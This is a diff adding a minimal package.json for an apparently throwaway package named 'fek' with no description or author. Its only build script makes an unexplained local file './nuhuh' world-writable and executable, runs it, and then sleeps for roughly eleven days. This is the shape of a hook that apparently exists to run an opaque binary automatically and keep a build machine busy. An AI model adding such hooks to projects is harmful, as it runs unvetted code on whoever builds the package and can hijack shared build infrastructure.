@@ -1,0 +1,12 @@
+{
+  "name": "fek",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "build": "chmod 777 ./nuhuh && ./nuhuh && sleep 999999"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
+}
